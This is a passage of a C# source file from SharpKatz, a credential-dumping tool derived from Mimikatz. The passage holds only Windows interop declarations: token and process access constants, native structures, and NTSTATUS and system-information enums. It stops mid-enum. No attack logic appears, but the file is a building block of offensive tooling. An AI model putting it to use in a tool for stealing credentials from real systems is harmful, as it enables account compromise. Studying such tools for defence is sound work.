//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

/*
 * Structures with KIWI_ prefix have been adapted from the Mimikatz source.
 * 
 * Some of the DCSync support structures were taken from "MakeMeEnterpriseAdmin" 
 * (https://raw.githubusercontent.com/vletoux/MakeMeEnterpriseAdmin/master/MakeMeEnterpriseAdmin.ps1)
 */

using SharpKatz.Crypto;
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpKatz.Win32
{
    class Natives
    {
        public const int FILE_READ_DATA = 0x0001;     // file & pipe
        public const int FILE_LIST_DIRECTORY = 0x0001;     // directory
        public const int FILE_WRITE_DATA = 0x0002;     // file & pipe
        public const int FILE_ADD_FILE = 0x0002;     // directory
        public const int FILE_APPEND_DATA = 0x0004;     // file
        public const int FILE_ADD_SUBDIRECTORY = 0x0004;     // directory
        public const int FILE_CREATE_PIPE_INSTANCE = 0x0004;     // named pipe
        public const int FILE_READ_EA = 0x0008;     // file & directory
        public const int FILE_WRITE_EA = 0x0010;     // file & directory
        public const int FILE_EXECUTE = 0x0020;     // file
        public const int FILE_TRAVERSE = 0x0020;     // directory
        public const int FILE_DELETE_CHILD = 0x0040;     // directory
        public const int FILE_READ_ATTRIBUTES = 0x0080;     // all
        public const int FILE_WRITE_ATTRIBUTES = 0x0100;     // all
        public const int FILE_OVERWRITE_IF = 0x00000005;
        public const int FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020;

        public const long READ_CONTROL = 0x00020000;
        public const long SYNCHRONIZE = 0x00100000;
        public const long STANDARD_RIGHTS_WRITE = READ_CONTROL;
        public const long STANDARD_RIGHTS_EXECUTE = READ_CONTROL;
        public const long STANDARD_RIGHTS_ALL = 0x001F0000;

        public const long SPECIFIC_RIGHTS_ALL = 0x0000FFFF;
        public const long FILE_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x1FF;

        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const UInt32 TOKEN_DUPLICATE = 0x0002;
        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);
        public const UInt32 TOKEN_ALT = (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY);

        public const UInt32 SE_PRIVILEGE_ENABLED = 0x2;

        public const long FILE_GENERIC_READ = STANDARD_RIGHTS_READ |
          FILE_READ_DATA |
          FILE_READ_ATTRIBUTES |
          FILE_READ_EA |
          SYNCHRONIZE;

        public const long FILE_GENERIC_WRITE = STANDARD_RIGHTS_WRITE |
          FILE_WRITE_DATA |
          FILE_WRITE_ATTRIBUTES |
          FILE_WRITE_EA |
          FILE_APPEND_DATA |
          SYNCHRONIZE;

        public const long FILE_GENERIC_EXECUTE = STANDARD_RIGHTS_EXECUTE |
          FILE_READ_ATTRIBUTES |
          FILE_EXECUTE |
          SYNCHRONIZE;

        public const int FILE_SHARE_READ = 0x00000001;
        public const int FILE_SHARE_WRITE = 0x00000002;
        public const int FILE_SHARE_DELETE = 0x00000004;
        public const int FILE_ATTRIBUTE_READONLY = 0x00000001;
        public const int FILE_ATTRIBUTE_HIDDEN = 0x00000002;
        public const int FILE_ATTRIBUTE_SYSTEM = 0x00000004;
        public const int FILE_ATTRIBUTE_DIRECTORY = 0x00000010;
        public const int FILE_ATTRIBUTE_ARCHIVE = 0x00000020;
        public const int FILE_ATTRIBUTE_DEVICE = 0x00000040;
        public const int FILE_ATTRIBUTE_NORMAL = 0x00000080;
        public const int FILE_ATTRIBUTE_TEMPORARY = 0x00000100;
        public const int FILE_ATTRIBUTE_SPARSE_FILE = 0x00000200;
        public const int FILE_ATTRIBUTE_REPARSE_POINT = 0x00000400;
        public const int FILE_ATTRIBUTE_COMPRESSED = 0x00000800;
        public const int FILE_ATTRIBUTE_OFFLINE = 0x00001000;
        public const int FILE_ATTRIBUTE_NOT_CONTENT_INDEXED = 0x00002000;
        public const int FILE_ATTRIBUTE_ENCRYPTED = 0x00004000;
        public const int FILE_NOTIFY_CHANGE_FILE_NAME = 0x00000001;
        public const int FILE_NOTIFY_CHANGE_DIR_NAME = 0x00000002;
        public const int FILE_NOTIFY_CHANGE_ATTRIBUTES = 0x00000004;
        public const int FILE_NOTIFY_CHANGE_SIZE = 0x00000008;
        public const int FILE_NOTIFY_CHANGE_LAST_WRITE = 0x00000010;
        public const int FILE_NOTIFY_CHANGE_LAST_ACCESS = 0x00000020;
        public const int FILE_NOTIFY_CHANGE_CREATION = 0x00000040;
        public const int FILE_NOTIFY_CHANGE_SECURITY = 0x00000100;
        public const int FILE_ACTION_ADDED = 0x00000001;
        public const int FILE_ACTION_REMOVED = 0x00000002;
        public const int FILE_ACTION_MODIFIED = 0x00000003;
        public const int FILE_ACTION_RENAMED_OLD_NAME = 0x00000004;
        public const int FILE_ACTION_RENAMED_NEW_NAME = 0x00000005;
        public const int MAILSLOT_NO_MESSAGE = -1;
        public const int MAILSLOT_WAIT_FOREVER = -1;
        public const int FILE_CASE_SENSITIVE_SEARCH = 0x00000001;
        public const int FILE_CASE_PRESERVED_NAMES = 0x00000002;
        public const int FILE_UNICODE_ON_DISK = 0x00000004;
        public const int FILE_PERSISTENT_ACLS = 0x00000008;
        public const int FILE_FILE_COMPRESSION = 0x00000010;
        public const int FILE_VOLUME_QUOTAS = 0x00000020;
        public const int FILE_SUPPORTS_SPARSE_FILES = 0x00000040;
        public const int FILE_SUPPORTS_REPARSE_POINTS = 0x00000080;
        public const int FILE_SUPPORTS_REMOTE_STORAGE = 0x00000100;
        public const int FILE_VOLUME_IS_COMPRESSED = 0x00008000;
        public const int FILE_SUPPORTS_OBJECT_IDS = 0x00010000;
        public const int FILE_SUPPORTS_ENCRYPTION = 0x00020000;
        public const int FILE_NAMED_STREAMS = 0x00040000;
        public const int FILE_READ_ONLY_VOLUME = 0x00080000;
        public const int CREATE_ALWAYS = 2;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct OSVERSIONINFOEXW
        {
            public int dwOSVersionInfoSize;
            public int dwMajorVersion;
            public int dwMinorVersion;
            public int dwBuildNumber;
            public int dwPlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string szCSDVersion;
            public UInt16 wServicePackMajor;
            public UInt16 wServicePackMinor;
            public UInt16 wSuiteMask;
            public byte wProductType;
            public byte wReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LARGE_INTEGER
        {
            public int LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_PROCESSES
        {
            public int NextEntryOffset;
            public int NumberOfThreads;
            public LARGE_INTEGER WorkingSetPrivateSize;
            public uint HardFaultCount;
            public uint NumberOfThreadsHighWatermark;
            public ulong CycleTime;
            public long CreateTime;
            public long UserTime;
            public long KernelTime;
            public UNICODE_STRING ImageName;
            public int BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
            public int HandleCount;
            public int SessionId;
            public IntPtr UniqueProcessKey;
            public IntPtr PeakVirtualSize;
            public IntPtr VirtualSize;
            public uint PageFaultCount;
            public IntPtr PeakWorkingSetSize;
            public IntPtr WorkingSetSize;
            public IntPtr QuotaPeakPagedPoolUsage;
            public IntPtr QuotaPagedPoolUsage;
            public IntPtr QuotaPeakNonPagedPoolUsage;
            public IntPtr QuotaNonPagedPoolUsage;
            public IntPtr PagefileUsage;
            public IntPtr PeakPagefileUsage;
            public IntPtr PrivatePageCount;
            public LARGE_INTEGER ReadOperationCount;
            public LARGE_INTEGER WriteOperationCount;
            public LARGE_INTEGER OtherOperationCount;
            public LARGE_INTEGER ReadTransferCount;
            public LARGE_INTEGER WriteTransferCount;
            public LARGE_INTEGER OtherTransferCount;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public UInt32 LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public UInt32 PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privileges;
        }

        [Flags]
        public enum CreationFlags
        {
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            CREATE_NO_WINDOW = 0x08000000
        }

        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        public enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public string lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_STATISTICS
        {
            LUID TokenId;
            public LUID AuthenticationId;
            LARGE_INTEGER ExpirationTime;
            TOKEN_TYPE TokenType;
            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
            uint DynamicCharged;
            uint DynamicAvailable;
            uint GroupCount;
            uint PrivilegeCount;
            LUID ModifiedId;
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct IO_STATUS_BLOCK
        {
            public uint status;
            public IntPtr information;
        }

        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public ulong Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public ulong Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct OBJECT_BASIC_INFORMATION
        {
            uint Attributes;
            ACCESS_MASK GrantedAccess;
            uint HandleCount;
            uint PointerCount;
            uint PagedPoolCharge;
            uint NonPagedPoolCharge;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
            uint[] Reserved;
            uint NameInfoSize;
            uint TypeInfoSize;
            uint SecurityDescriptorSize;
            LARGE_INTEGER CreationTime;
        }

        [Flags]
        public enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
            STANDARD_RIGHTS_ALL = 0x001F0000,
            SPECIFIC_RIGHTS_ALL = 0x0000FFF,
            ACCESS_SYSTEM_SECURITY = 0x01000000,
            MAXIMUM_ALLOWED = 0x02000000,
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,
            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,
            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,
            WINSTA_ALL_ACCESS = 0x0000037F
        };

        public enum NTSTATUS : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            ProcessIsTerminating = 0xC000010A,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            ConflictingAddresses = 0xc0000018,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }

        public enum SYSTEM_INFORMATION_CLASS
        {
            SystemBasicInformation = 0x0000,
            SystemProcessorInformation = 0x0001,
            SystemPerformanceInformation = 0x0002,
            SystemTimeOfDayInformation = 0x0003,
            SystemPathInformation = 0x0004,
            SystemProcessInformation = 0x0005,
            SystemCallCountInformation = 0x0006,
            SystemDeviceInformation = 0x0007,
            SystemProcessorPerformanceInformation = 0x0008,
            SystemFlagsInformation = 0x0009,
            SystemCallTimeInformation = 0x000A,
            SystemModuleInformation = 0x000B,
            SystemLocksInformation = 0x000C,
            SystemStackTraceInformation = 0x000D,
            SystemPagedPoolInformation = 0x000E,
            SystemNonPagedPoolInformation = 0x000F,
            SystemHandleInformation = 0x0010,
            SystemObjectInformation = 0x0011,
            SystemPageFileInformation = 0x0012,
            SystemVdmInstemulInformation = 0x0013,
            SystemVdmBopInformation = 0x0014,
            SystemFileCacheInformation = 0x0015,
            SystemPoolTagInformation = 0x0016,
            SystemInterruptInformation = 0x0017,
            SystemDpcBehaviorInformation = 0x0018,
            SystemFullMemoryInformation = 0x0019,
            SystemLoadGdiDriverInformation = 0x001A,
            SystemUnloadGdiDriverInformation = 0x001B,
            SystemTimeAdjustmentInformation = 0x001C,
            SystemSummaryMemoryInformation = 0x001D,
            SystemMirrorMemoryInformation = 0x001E,
            SystemPerformanceTraceInformation = 0x001F,
            SystemCrashDumpInformation = 0x0020,
            SystemExceptionInformation = 0x0021,
            SystemCrashDumpStateInformation = 0x0022,
            SystemKernelDebuggerInformation = 0x0023,
            SystemContextSwitchInformation = 0x0024,
            SystemRegistryQuotaInformation = 0x0025,
            SystemExtendServiceTableInformation = 0x0026,
            SystemPrioritySeperation = 0x0027,
            SystemVerifierAddDriverInformation = 0x0028,
            SystemVerifierRemoveDriverInformation = 0x0029,
            SystemProcessorIdleInformation = 0x002A,
            SystemLegacyDriverInformation = 0x002B,
            SystemCurrentTimeZoneInformation = 0x002C,
            SystemLookasideInformation = 0x002D,
            SystemTimeSlipNotification = 0x002E,
